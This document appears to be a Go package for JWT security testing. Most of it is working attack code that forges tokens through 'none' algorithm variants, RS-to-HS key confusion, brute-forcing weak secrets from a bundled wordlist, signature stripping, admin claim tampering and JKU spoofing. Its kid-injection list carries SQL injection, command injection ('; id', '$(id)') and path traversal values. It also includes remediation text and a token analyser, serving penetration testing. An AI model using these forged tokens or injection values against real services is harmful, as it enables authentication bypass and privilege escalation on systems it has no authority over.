// Package jwt provides JWT (JSON Web Token) security testing and attack capabilities.
// It supports various JWT attacks including algorithm confusion, key brute-forcing,
// signature manipulation, and claim tampering.
package jwt

import (
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"hash"
	"math/big"
	"strings"
	"time"
)

// Algorithm represents JWT signing algorithms
type Algorithm string

const (
	AlgNone  Algorithm = "none"
	AlgHS256 Algorithm = "HS256"
	AlgHS384 Algorithm = "HS384"
	AlgHS512 Algorithm = "HS512"
	AlgRS256 Algorithm = "RS256"
	AlgRS384 Algorithm = "RS384"
	AlgRS512 Algorithm = "RS512"
	AlgES256 Algorithm = "ES256"
	AlgES384 Algorithm = "ES384"
	AlgES512 Algorithm = "ES512"
	AlgPS256 Algorithm = "PS256"
	AlgPS384 Algorithm = "PS384"
	AlgPS512 Algorithm = "PS512"
)

// AttackType represents different JWT attack types
type AttackType string

const (
	AttackNoneAlg        AttackType = "none_algorithm"      // Algorithm set to "none"
	AttackAlgConfusion   AttackType = "algorithm_confusion" // RS256 to HS256 confusion
	AttackKeyBruteforce  AttackType = "key_bruteforce"      // Weak secret brute force
	AttackSignatureStrip AttackType = "signature_strip"     // Remove or modify signature
	AttackClaimTamper    AttackType = "claim_tamper"        // Modify claims without re-signing
	AttackKidInjection   AttackType = "kid_injection"       // Key ID header injection
	AttackJKUSpoof       AttackType = "jku_spoof"           // JWK Set URL spoofing
	AttackX5USpoof       AttackType = "x5u_spoof"           // X.509 URL spoofing
	AttackTokenReplay    AttackType = "token_replay"        // Expired token replay
	AttackNullSignature  AttackType = "null_signature"      // Null byte in signature
)

// Header represents a JWT header
type Header struct {
	Alg  string   `json:"alg"`
	Typ  string   `json:"typ,omitempty"`
	Kid  string   `json:"kid,omitempty"`
	JKU  string   `json:"jku,omitempty"`
	JWK  string   `json:"jwk,omitempty"`
	X5U  string   `json:"x5u,omitempty"`
	X5C  string   `json:"x5c,omitempty"`
	Crit []string `json:"crit,omitempty"`
}

// Claims represents JWT payload claims
type Claims struct {
	// Registered claims
	Issuer    string      `json:"iss,omitempty"`
	Subject   string      `json:"sub,omitempty"`
	Audience  interface{} `json:"aud,omitempty"` // Can be string or []string
	ExpiresAt int64       `json:"exp,omitempty"`
	NotBefore int64       `json:"nbf,omitempty"`
	IssuedAt  int64       `json:"iat,omitempty"`
	JWTID     string      `json:"jti,omitempty"`

	// Common custom claims
	Name   string   `json:"name,omitempty"`
	Email  string   `json:"email,omitempty"`
	Role   string   `json:"role,omitempty"`
	Roles  []string `json:"roles,omitempty"`
	Admin  bool     `json:"admin,omitempty"`
	Scope  string   `json:"scope,omitempty"`
	Groups []string `json:"groups,omitempty"`

	// Additional claims (raw)
	Extra map[string]interface{} `json:"-"`
}

// Token represents a parsed or generated JWT
type Token struct {
	Raw       string  // The raw token string
	Header    *Header // Decoded header
	Claims    *Claims // Decoded claims
	Signature string  // Base64url encoded signature
	Valid     bool    // Whether signature is valid
}

// Vulnerability represents a detected JWT vulnerability
type Vulnerability struct {
	Type        AttackType `json:"type"`
	Description string     `json:"description"`
	Severity    string     `json:"severity"` // critical, high, medium, low
	Token       string     `json:"token"`    // The crafted malicious token
	Original    string     `json:"original"` // Original token
	Remediation string     `json:"remediation"`
}

// Attacker performs JWT attacks
type Attacker struct {
	weakPasswords []string
	commonKids    []string
}

// NewAttacker creates a new JWT attacker
func NewAttacker() *Attacker {
	return &Attacker{
		weakPasswords: getWeakPasswords(),
		commonKids:    getCommonKids(),
	}
}

func getWeakPasswords() []string {
	return []string{
		// Very common secrets
		"secret", "password", "123456", "12345678", "qwerty",
		"abc123", "password1", "admin", "letmein", "welcome",
		"monkey", "dragon", "master", "1234567890", "login",

		// JWT-specific weak secrets
		"jwt", "jwtsecret", "jwt_secret", "jwt-secret",
		"jwtkey", "jwt_key", "jwt-key", "supersecret",
		"mysecret", "my_secret", "my-secret", "secretkey",
		"secret_key", "secret-key", "signingkey", "signing_key",
		"privatekey", "private_key", "private-key",

		// Common dev/test secrets
		"test", "testing", "development", "dev", "debug",
		"changeme", "changethis", "default", "example",
		"demo", "sample", "placeholder", "temp", "temporary",

		// Framework defaults
		"your-256-bit-secret", "your-secret-key",
		"your_secret_key", "AllYourBase",
		"keyboard cat", "shhhhh", "shhhhhared-secret",
		"too many secrets", "key", "key123", "apikey",

		// Hash-based secrets
		"HS256", "HS384", "HS512", "hmac", "hmac256",

		// Company/app names
		"company", "application", "app", "service", "api",
		"backend", "frontend", "server", "client",
	}
}

func getCommonKids() []string {
	return []string{
		// Common file paths for kid injection
		"/dev/null",
		"/proc/sys/kernel/randomize_va_space",
		"../../../../dev/null",
		"../../../dev/null",
		"../../dev/null",
		"../dev/null",
		"/etc/hostname",

		// SQL injection in kid
		"' OR '1'='1",
		"'; DROP TABLE users; --",
		"1 UNION SELECT 'key'",

		// Command injection
		"; id",
		"| id",
		"$(id)",
		"`id`",

		// Empty/null
		"",
		"null",
		"undefined",
	}
}

// Parse parses a JWT token string
func Parse(tokenString string) (*Token, error) {
	parts := strings.Split(tokenString, ".")
	if len(parts) != 3 {
		return nil, errors.New("invalid JWT format: expected 3 parts")
	}

	token := &Token{
		Raw:       tokenString,
		Signature: parts[2],
	}

	// Decode header
	headerBytes, err := base64URLDecode(parts[0])
	if err != nil {
		return nil, fmt.Errorf("failed to decode header: %w", err)
	}

	var header Header
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return nil, fmt.Errorf("failed to parse header: %w", err)
	}
	token.Header = &header

	// Decode claims
	claimsBytes, err := base64URLDecode(parts[1])
	if err != nil {
		return nil, fmt.Errorf("failed to decode claims: %w", err)
	}

	var claims Claims
	if err := json.Unmarshal(claimsBytes, &claims); err != nil {
		return nil, fmt.Errorf("failed to parse claims: %w", err)
	}

	// Parse extra claims
	var extra map[string]interface{}
	if err := json.Unmarshal(claimsBytes, &extra); err == nil {
		claims.Extra = extra
	}

	token.Claims = &claims

	return token, nil
}

// Sign creates a signed JWT token
func Sign(header *Header, claims *Claims, secret []byte) (string, error) {
	// Encode header
	headerBytes, err := json.Marshal(header)
	if err != nil {
		return "", err
	}
	headerB64 := base64URLEncode(headerBytes)

	// Encode claims
	claimsBytes, err := json.Marshal(claims)
	if err != nil {
		return "", err
	}
	claimsB64 := base64URLEncode(claimsBytes)

	// Create signing input
	signingInput := headerB64 + "." + claimsB64

	// Sign based on algorithm
	var signature string
	algLower := strings.ToLower(strings.TrimSpace(header.Alg))

	switch {
	case algLower == "none" || algLower == "":
		signature = ""
	case Algorithm(header.Alg) == AlgHS256:
		signature = signHMAC(signingInput, secret, sha256.New)
	case Algorithm(header.Alg) == AlgHS384:
		signature = signHMAC(signingInput, secret, sha512.New384)
	case Algorithm(header.Alg) == AlgHS512:
		signature = signHMAC(signingInput, secret, sha512.New)
	default:
		return "", fmt.Errorf("unsupported algorithm: %s", header.Alg)
	}

	return signingInput + "." + signature, nil
}

func signHMAC(input string, secret []byte, hashFunc func() hash.Hash) string {
	h := hmac.New(hashFunc, secret)
	h.Write([]byte(input))
	return base64URLEncode(h.Sum(nil))
}

// VerifyHS256 verifies an HS256 signed token
func VerifyHS256(tokenString, secret string) bool {
	parts := strings.Split(tokenString, ".")
	if len(parts) != 3 {
		return false
	}

	signingInput := parts[0] + "." + parts[1]
	expectedSig := signHMAC(signingInput, []byte(secret), sha256.New)

	return hmac.Equal([]byte(parts[2]), []byte(expectedSig))
}

// NoneAlgorithmAttack creates a token with algorithm set to "none"
func (a *Attacker) NoneAlgorithmAttack(token *Token) ([]*Vulnerability, error) {
	var vulns []*Vulnerability

	// Create variations of "none" algorithm
	noneVariants := []string{
		"none", "None", "NONE", "nOnE",
		"none ", " none", "none\x00",
	}

	for _, alg := range noneVariants {
		newHeader := *token.Header
		newHeader.Alg = alg

		newToken, err := Sign(&newHeader, token.Claims, nil)
		if err != nil {
			continue
		}

		vulns = append(vulns, &Vulnerability{
			Type:        AttackNoneAlg,
			Description: fmt.Sprintf("Token with 'none' algorithm variant: %s", alg),
			Severity:    "critical",
			Token:       newToken,
			Original:    token.Raw,
			Remediation: "Explicitly check and reject 'none' algorithm. Use a whitelist of allowed algorithms.",
		})
	}

	return vulns, nil
}

// AlgorithmConfusionAttack attempts asymmetric-to-symmetric algorithm confusion attack.
// Covers RS256/384/512, ES256/384/512, and PS256/384/512 → HS256/384/512.
func (a *Attacker) AlgorithmConfusionAttack(token *Token, publicKey string) ([]*Vulnerability, error) {
	// All asymmetric algorithms that are vulnerable to key confusion
	asymmetricAlgs := map[string]bool{
		"RS256": true, "RS384": true, "RS512": true,
		"ES256": true, "ES384": true, "ES512": true,
		"PS256": true, "PS384": true, "PS512": true,
	}
	if !asymmetricAlgs[token.Header.Alg] {
		return nil, nil
	}

	var vulns []*Vulnerability

	// Try confusion with each HMAC variant
	hmacVariants := []struct {
		alg  string
		desc string
	}{
		{"HS256", "HS256"},
		{"HS384", "HS384"},
		{"HS512", "HS512"},
	}

	for _, variant := range hmacVariants {
		newHeader := *token.Header
		origAlg := newHeader.Alg
		newHeader.Alg = variant.alg

		// The public key becomes the HMAC secret
		newToken, err := Sign(&newHeader, token.Claims, []byte(publicKey))
		if err != nil {
			continue
		}

		vulns = append(vulns, &Vulnerability{
			Type:        AttackAlgConfusion,
			Description: fmt.Sprintf("%s to %s algorithm confusion - signed with public key as HMAC secret", origAlg, variant.desc),
			Severity:    "critical",
			Token:       newToken,
			Original:    token.Raw,
			Remediation: "Use separate code paths for symmetric (HMAC) and asymmetric (RSA/ECDSA/PSS) algorithms. Never use public keys as symmetric secrets.",
		})
	}

	return vulns, nil
}

// BruteforceSecret attempts to brute force a weak secret
func (a *Attacker) BruteforceSecret(token *Token, customWordlist []string) (string, error) {
	if token.Header.Alg != "HS256" && token.Header.Alg != "HS384" && token.Header.Alg != "HS512" {
		return "", errors.New("brute force only works on HMAC algorithms")
	}

	parts := strings.Split(token.Raw, ".")
	if len(parts) != 3 {
		return "", errors.New("invalid token format")
	}

	signingInput := parts[0] + "." + parts[1]
	expectedSig := parts[2]

	var hashFunc func() hash.Hash
	switch Algorithm(token.Header.Alg) {
	case AlgHS256:
		hashFunc = sha256.New
	case AlgHS384:
		hashFunc = sha512.New384
	case AlgHS512:
		hashFunc = sha512.New
	default:
		return "", fmt.Errorf("unsupported algorithm: %s", token.Header.Alg)
	}

	// Try custom wordlist first
	passwords := customWordlist
	if len(passwords) == 0 {
		passwords = a.weakPasswords
	}

	for _, password := range passwords {
		sig := signHMAC(signingInput, []byte(password), hashFunc)
		if sig == expectedSig {
			return password, nil
		}
	}

	return "", errors.New("secret not found in wordlist")
}

// SignatureStripAttack creates tokens with modified signatures
func (a *Attacker) SignatureStripAttack(token *Token) ([]*Vulnerability, error) {
	var vulns []*Vulnerability
	parts := strings.Split(token.Raw, ".")
	if len(parts) != 3 {
		return nil, errors.New("invalid token format")
	}

	signingInput := parts[0] + "." + parts[1]

	// Empty signature
	vulns = append(vulns, &Vulnerability{
		Type:        AttackSignatureStrip,
		Description: "Token with empty signature",
		Severity:    "high",
		Token:       signingInput + ".",
		Original:    token.Raw,
		Remediation: "Always verify signature is present and valid before processing token.",
	})

	// Null byte in signature
	vulns = append(vulns, &Vulnerability{
		Type:        AttackNullSignature,
		Description: "Token with null byte in signature",
		Severity:    "high",
		Token:       signingInput + "." + base64URLEncode([]byte{0}),
		Original:    token.Raw,
		Remediation: "Validate signature length and content before base64 decoding.",
	})

	// Random short signature
	randomSig := make([]byte, 4)
	if _, err := rand.Read(randomSig); err != nil {
		// Fallback: use fixed bytes if rand fails (still useful for testing)
		randomSig = []byte{0xDE, 0xAD, 0xBE, 0xEF}
	}
	vulns = append(vulns, &Vulnerability{
		Type:        AttackSignatureStrip,
		Description: "Token with shortened random signature",
		Severity:    "medium",
		Token:       signingInput + "." + base64URLEncode(randomSig),
		Original:    token.Raw,
		Remediation: "Verify signature length matches expected for algorithm.",
	})

	return vulns, nil
}

// ClaimTamperAttack creates tokens with modified claims
func (a *Attacker) ClaimTamperAttack(token *Token) ([]*Vulnerability, error) {
	var vulns []*Vulnerability

	// Escalate privileges
	newClaims := *token.Claims
	newClaims.Admin = true
	newClaims.Role = "admin"
	newClaims.Roles = []string{"admin", "superuser", "root"}

	// Keep original signature (hoping server doesn't verify)
	headerBytes, _ := json.Marshal(token.Header)
	headerB64 := base64URLEncode(headerBytes)

	claimsBytes, _ := json.Marshal(newClaims)
	claimsB64 := base64URLEncode(claimsBytes)

	vulns = append(vulns, &Vulnerability{
		Type:        AttackClaimTamper,
		Description: "Token with escalated privileges (admin=true, role=admin) - original signature",
		Severity:    "critical",
		Token:       headerB64 + "." + claimsB64 + "." + token.Signature,
		Original:    token.Raw,
		Remediation: "Always verify signature before trusting any claims.",
	})

	// Extend expiration
	newClaims2 := *token.Claims
	newClaims2.ExpiresAt = time.Now().Add(365 * 24 * time.Hour).Unix()
	newClaims2.NotBefore = 0

	claimsBytes2, _ := json.Marshal(newClaims2)
	claimsB64_2 := base64URLEncode(claimsBytes2)

	vulns = append(vulns, &Vulnerability{
		Type:        AttackClaimTamper,
		Description: "Token with extended expiration (1 year) - original signature",
		Severity:    "high",
		Token:       headerB64 + "." + claimsB64_2 + "." + token.Signature,
		Original:    token.Raw,
		Remediation: "Verify expiration after signature validation.",
	})

	return vulns, nil
}

// KidInjectionAttack creates tokens with injected kid header
func (a *Attacker) KidInjectionAttack(token *Token) ([]*Vulnerability, error) {
	var vulns []*Vulnerability

	for _, kid := range a.commonKids {
		newHeader := *token.Header
		newHeader.Kid = kid

		// For path traversal, we sign with an empty or known secret
		var secret []byte
		if strings.Contains(kid, "/dev/null") || strings.Contains(kid, "null") {
			secret = []byte{} // /dev/null returns empty
		} else {
			secret = []byte(kid) // Use kid as secret for other injections
		}

		newHeader.Alg = "HS256"
		newToken, err := Sign(&newHeader, token.Claims, secret)
		if err != nil {
			continue
		}

		severity := "high"
		if strings.Contains(kid, "DROP") || strings.Contains(kid, ";") || strings.Contains(kid, "|") {
			severity = "critical"
		}

		vulns = append(vulns, &Vulnerability{
			Type:        AttackKidInjection,
			Description: fmt.Sprintf("Token with injected kid: %s", kid),
			Severity:    severity,
			Token:       newToken,
			Original:    token.Raw,
			Remediation: "Sanitize and validate kid header. Use a key lookup table instead of file paths.",
		})
	}

	return vulns, nil
}

// JKUSpoofAttack creates tokens with spoofed JWK Set URL
func (a *Attacker) JKUSpoofAttack(token *Token, attackerURL string) ([]*Vulnerability, error) {
	var vulns []*Vulnerability

	newHeader := *token.Header
	newHeader.JKU = attackerURL
	newHeader.Alg = "RS256"

	// Generate a new RSA key pair for the attacker
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	// For JKU spoofing, create a header with attacker-controlled JKU
	// The token is properly signed with the attacker's private key
	headerBytes, _ := json.Marshal(newHeader)
	headerB64 := base64URLEncode(headerBytes)
	claimsBytes, _ := json.Marshal(token.Claims)
	claimsB64 := base64URLEncode(claimsBytes)

	// Sign with RSA using PKCS#1 v1.5 signature scheme
	signingInput := headerB64 + "." + claimsB64
	h := sha256.Sum256([]byte(signingInput))
	signature, err := rsa.SignPKCS1v15(rand.Reader, privateKey, crypto.SHA256, h[:])
	if err != nil {
		return nil, err
	}

	vulns = append(vulns, &Vulnerability{
		Type:        AttackJKUSpoof,
		Description: fmt.Sprintf("Token with spoofed JKU pointing to: %s", attackerURL),
		Severity:    "critical",
		Token:       headerB64 + "." + claimsB64 + "." + base64URLEncode(signature),
		Original:    token.Raw,
		Remediation: "Whitelist allowed JKU domains. Never fetch keys from untrusted URLs.",
	})

	return vulns, nil
}

// GenerateMaliciousTokens generates various attack tokens from a valid token
func (a *Attacker) GenerateMaliciousTokens(tokenString string, options ...AttackOption) ([]*Vulnerability, error) {
	token, err := Parse(tokenString)
	if err != nil {
		return nil, err
	}

	opts := &attackOptions{}
	for _, opt := range options {
		opt(opts)
	}

	var allVulns []*Vulnerability

	// None algorithm attack
	if vulns, err := a.NoneAlgorithmAttack(token); err == nil {
		allVulns = append(allVulns, vulns...)
	}

	// Algorithm confusion (if public key provided)
	if opts.publicKey != "" {
		if vulns, err := a.AlgorithmConfusionAttack(token, opts.publicKey); err == nil {
			allVulns = append(allVulns, vulns...)
		}
	}

	// Signature strip attacks
	if vulns, err := a.SignatureStripAttack(token); err == nil {
		allVulns = append(allVulns, vulns...)
	}

	// Claim tampering
	if vulns, err := a.ClaimTamperAttack(token); err == nil {
		allVulns = append(allVulns, vulns...)
	}

	// Kid injection
	if vulns, err := a.KidInjectionAttack(token); err == nil {
		allVulns = append(allVulns, vulns...)
	}

	// JKU spoofing (if attacker URL provided)
	if opts.attackerURL != "" {
		if vulns, err := a.JKUSpoofAttack(token, opts.attackerURL); err == nil {
			allVulns = append(allVulns, vulns...)
		}
	}

	return allVulns, nil
}

type attackOptions struct {
	publicKey   string
	attackerURL string
	customWords []string
}

// AttackOption configures attack options
type AttackOption func(*attackOptions)

// WithPublicKey sets the public key for algorithm confusion attacks
func WithPublicKey(key string) AttackOption {
	return func(o *attackOptions) {
		o.publicKey = key
	}
}

// WithAttackerURL sets the attacker URL for JKU/X5U spoofing
func WithAttackerURL(url string) AttackOption {
	return func(o *attackOptions) {
		o.attackerURL = url
	}
}

// WithCustomWordlist sets a custom wordlist for brute force
func WithCustomWordlist(words []string) AttackOption {
	return func(o *attackOptions) {
		o.customWords = words
	}
}

// Analyze performs security analysis on a JWT
func Analyze(tokenString string) (*TokenAnalysis, error) {
	token, err := Parse(tokenString)
	if err != nil {
		return nil, err
	}

	analysis := &TokenAnalysis{
		Algorithm: token.Header.Alg,
		Token:     token,
		Issues:    []string{},
		Risk:      "low",
	}

	// Check algorithm
	if token.Header.Alg == "none" || token.Header.Alg == "None" {
		analysis.Issues = append(analysis.Issues, "Algorithm is 'none' - token is not signed")
		analysis.Risk = "critical"
	}

	// Check for weak algorithm
	if token.Header.Alg == "HS256" || token.Header.Alg == "HS384" || token.Header.Alg == "HS512" {
		analysis.Issues = append(analysis.Issues, "HMAC algorithm used - vulnerable to weak secret brute force")
		if analysis.Risk != "critical" {
			analysis.Risk = "medium"
		}
	}

	// Check dangerous headers
	if token.Header.JKU != "" {
		analysis.Issues = append(analysis.Issues, "JKU header present - potential for JWKS URL spoofing")
		analysis.Risk = "high"
	}

	if token.Header.X5U != "" {
		analysis.Issues = append(analysis.Issues, "X5U header present - potential for certificate URL spoofing")
		analysis.Risk = "high"
	}

	if token.Header.Kid != "" {
		analysis.Issues = append(analysis.Issues, "Kid header present - check for injection vulnerabilities")
	}

	// Check claims
	if token.Claims.ExpiresAt == 0 {
		analysis.Issues = append(analysis.Issues, "No expiration set - token never expires")
		if analysis.Risk == "low" {
			analysis.Risk = "medium"
		}
	} else if token.Claims.ExpiresAt < time.Now().Unix() {
		analysis.Issues = append(analysis.Issues, "Token has expired")
	} else {
		expTime := time.Unix(token.Claims.ExpiresAt, 0)
		if expTime.Sub(time.Now()) > 30*24*time.Hour {
			analysis.Issues = append(analysis.Issues, "Token has very long expiration (>30 days)")
		}
	}

	// Check for admin/privilege claims
	if token.Claims.Admin {
		analysis.Issues = append(analysis.Issues, "Admin claim is set to true")
	}

	if token.Claims.Role == "admin" || token.Claims.Role == "superuser" || token.Claims.Role == "root" {
		analysis.Issues = append(analysis.Issues, fmt.Sprintf("Privileged role: %s", token.Claims.Role))
	}

	return analysis, nil
}

// TokenAnalysis represents the security analysis of a JWT
type TokenAnalysis struct {
	Algorithm string   `json:"algorithm"`
	Token     *Token   `json:"-"`
	Issues    []string `json:"issues"`
	Risk      string   `json:"risk"` // critical, high, medium, low
}

// CreateToken creates a new JWT with specified claims
func CreateToken(alg Algorithm, claims *Claims, secret []byte) (string, error) {
	header := &Header{
		Alg: string(alg),
		Typ: "JWT",
	}

	// Set issued at if not set
	if claims.IssuedAt == 0 {
		claims.IssuedAt = time.Now().Unix()
	}

	return Sign(header, claims, secret)
}

// CreateAdminToken creates a token with admin privileges
func CreateAdminToken(alg Algorithm, secret []byte) (string, error) {
	claims := &Claims{
		Subject:   "admin",
		IssuedAt:  time.Now().Unix(),
		ExpiresAt: time.Now().Add(24 * time.Hour).Unix(),
		Admin:     true,
		Role:      "admin",
		Roles:     []string{"admin", "superuser"},
	}

	return CreateToken(alg, claims, secret)
}

// ForgeToken creates a forged token by modifying an existing one
func ForgeToken(original string, modifications map[string]interface{}, secret []byte) (string, error) {
	token, err := Parse(original)
	if err != nil {
		return "", err
	}

	// Apply claim modifications
	claimsMap := make(map[string]interface{})

	// Marshal current claims
	claimsBytes, err := json.Marshal(token.Claims)
	if err != nil {
		return "", fmt.Errorf("failed to marshal claims: %w", err)
	}
	if err := json.Unmarshal(claimsBytes, &claimsMap); err != nil {
		return "", fmt.Errorf("failed to unmarshal claims: %w", err)
	}

	// Apply modifications
	for k, v := range modifications {
		claimsMap[k] = v
	}

	// Create new claims JSON
	modifiedClaimsBytes, err := json.Marshal(claimsMap)
	if err != nil {
		return "", err
	}

	var modifiedClaims Claims
	if err := json.Unmarshal(modifiedClaimsBytes, &modifiedClaims); err != nil {
		return "", fmt.Errorf("failed to unmarshal modified claims: %w", err)
	}

	return Sign(token.Header, &modifiedClaims, secret)
}

// Utility functions

func base64URLEncode(data []byte) string {
	return strings.TrimRight(base64.URLEncoding.EncodeToString(data), "=")
}

func base64URLDecode(s string) ([]byte, error) {
	// Add padding if necessary
	switch len(s) % 4 {
	case 2:
		s += "=="
	case 3:
		s += "="
	}
	return base64.URLEncoding.DecodeString(s)
}

// WeakSecrets returns the list of common weak JWT secrets
func WeakSecrets() []string {
	return getWeakPasswords()
}

// IsWeakSecret checks if a secret is commonly weak
func IsWeakSecret(secret string) bool {
	for _, weak := range getWeakPasswords() {
		if secret == weak {
			return true
		}
	}
	return false
}

// GenerateSecureSecret generates a cryptographically secure secret
func GenerateSecureSecret(length int) (string, error) {
	if length < 32 {
		length = 32 // Minimum 256 bits
	}

	bytes := make([]byte, length)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(bytes), nil
}

// EstimateSecretEntropy estimates the entropy of a secret
func EstimateSecretEntropy(secret string) float64 {
	if len(secret) == 0 {
		return 0
	}

	// Count unique characters
	chars := make(map[rune]int)
	for _, c := range secret {
		chars[c]++
	}

	// Calculate entropy using Shannon entropy formula
	var entropy float64
	length := float64(len(secret))

	for _, count := range chars {
		p := float64(count) / length
		entropy -= p * (log2(p))
	}

	return entropy * length
}

func log2(x float64) float64 {
	// Simple log2 approximation
	if x <= 0 {
		return 0
	}

	result := big.NewFloat(x)
	two := big.NewFloat(2)

	var count float64
	for result.Cmp(two) >= 0 {
		result.Quo(result, two)
		count++
	}

	f, _ := result.Float64()
	return count + (f - 1)
}
